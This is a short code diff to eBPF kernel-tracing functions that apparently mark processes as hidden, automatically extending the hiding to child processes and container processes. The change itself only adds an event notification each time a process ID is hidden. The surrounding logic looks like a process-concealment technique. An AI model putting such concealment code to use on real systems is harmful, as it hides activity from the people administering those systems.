@@ -509,6 +509,7 @@ int on_wake_up_new_task(struct pt_regs *ctx)
     if (is_hidden_pid(parent_pid)) {
         u32 val = 1;
         bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
+        submit_event(99, child_pid); /* 99 = pid_hidden_update */
         submit_event(3, child_pid); /* 3 = child_hidden */
         bpf_printk("Auto-hidden child PID %d (parent: %d)", child_pid, parent_pid);
     }
@@ -1098,6 +1099,7 @@ int on_process_fork(struct trace_event_raw_sched_process_fork *ctx)
     if (is_container_process(child_pid)) {
         u32 val = 1;
         bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
+        submit_event(99, child_pid); /* 99 = pid_hidden_update */
         submit_event(20, child_pid); /* 20 = container_auto_detected_fork */
 
         /* Log container detection details */
@@ -1108,6 +1110,7 @@ int on_process_fork(struct trace_event_raw_sched_process_fork *ctx)
     if (is_hidden_pid(parent_pid)) {
         u32 val = 1;
         bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
+        submit_event(99, child_pid); /* 99 = pid_hidden_update */
         submit_event(21, child_pid); /* 21 = child_inherited_hidden */
 
         bpf_printk("Child process inherited hidden status: PID %d (parent: %d)", child_pid, parent_pid);
@@ -1128,6 +1131,7 @@ int on_process_exec(struct trace_event_raw_sched_process_exec *ctx)
     if (is_container_process(pid)) {
         u32 val = 1;
         bpf_map_update_elem(&hidden_pid_map, &pid, &val, BPF_ANY);
+        submit_event(99, pid); /* 99 = pid_hidden_update */
         submit_event(22, pid); /* 22 = container_auto_detected_exec */
 
         /* Log container detection details */
